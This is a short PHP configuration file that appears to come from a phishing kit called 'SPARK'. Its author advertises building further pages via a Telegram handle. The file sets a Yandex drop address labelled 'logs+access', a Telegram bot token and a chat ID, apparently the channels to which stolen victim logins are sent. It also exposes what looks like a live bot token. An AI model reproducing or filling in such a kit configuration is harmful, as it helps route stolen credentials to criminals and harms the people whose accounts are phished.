<?php
// spark pages require
/// contact me for your suppprt and building of new pages
//Telegram : @jk_bek

// AUTH INFO

$Name = "SPARK";
$mail = "themariarobert@yandex.com"; // logs+access
$Token ="5513064426:AAHIflVMlls8-GwS9Z2TD6OGFj7yFurbCOI";
$ChatID ="5691618668";



?>